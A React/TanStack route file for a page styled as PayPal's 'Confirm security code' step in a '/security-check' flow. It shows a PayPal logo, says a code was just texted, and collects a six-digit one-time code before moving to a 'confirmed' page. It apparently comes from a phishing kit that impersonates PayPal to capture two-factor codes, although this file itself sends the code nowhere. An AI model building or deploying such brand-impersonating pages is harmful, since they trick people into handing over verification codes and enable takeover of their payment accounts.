import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { ArrowLeft } from "lucide-react";
import { PayPalLogo } from "@/components/paypal/PayPalLogo";

export const Route = createFileRoute("/security-check/code")({
  component: ConfirmCodePage,
  head: () => ({
    meta: [
      { title: "Confirm security code — PayPal" },
      { name: "description", content: "Enter the security code we just texted you." },
    ],
  }),
});

function ConfirmCodePage() {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);
  const isComplete = code.length === 6;

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  useEffect(() => {
    if (isComplete) {
      const t = setTimeout(() => navigate({ to: "/security-check/confirmed" }), 350);
      return () => clearTimeout(t);
    }
  }, [isComplete, navigate]);

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="relative flex items-center justify-center px-4 pt-5 pb-4">
        <Link to="/security-check" className="absolute left-4 top-5 text-[var(--pp-text)]">
          <ArrowLeft size={24} strokeWidth={2.25} />
        </Link>
        <h1 className="text-[15px] font-semibold text-[var(--pp-text)]">PayPal</h1>
      </header>

      <main className="flex-1 flex flex-col px-7 pt-6">
        <div className="flex justify-center">
          <PayPalLogo className="h-14 w-14" />
        </div>

        <h2 className="mt-6 text-center text-[28px] font-semibold text-[var(--pp-text)]">
          Confirm security code
        </h2>

        <p className="mt-3 text-center text-[15px] text-[var(--pp-text-muted)]">
          For your security, we just texted you a code. Please enter it below.
        </p>

        <div
          className="mt-10 flex justify-center gap-2"
          onClick={() => inputRef.current?.focus()}
        >
          {Array.from({ length: 6 }).map((_, i) => {
            const char = code[i] ?? "";
            const isActive = i === code.length;
            return (
              <div
                key={i}
                className={
                  "h-12 w-11 rounded-md border bg-white flex items-center justify-center text-[20px] font-semibold text-[var(--pp-text)] tabular-nums " +
                  (isActive
                    ? "border-[var(--pp-blue)] ring-1 ring-[var(--pp-blue)]"
                    : "border-[color:var(--border)]")
                }
              >
                {char}
              </div>
            );
          })}
          <input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            autoComplete="one-time-code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            aria-label="Security code"
            className="absolute opacity-0 pointer-events-none"
          />
        </div>

        <button className="mt-8 mx-auto text-[15px] font-semibold text-[var(--pp-link)]">
          Resend code
        </button>

        <div className="flex-1" />

        <button
          disabled={!isComplete}
          onClick={() => navigate({ to: "/security-check/confirmed" })}
          className="mb-6 w-full rounded-full bg-[var(--pp-blue-dark)] py-4 text-white text-[17px] font-semibold disabled:opacity-50"
        >
          Continue
        </button>
      </main>
    </div>
  );
}
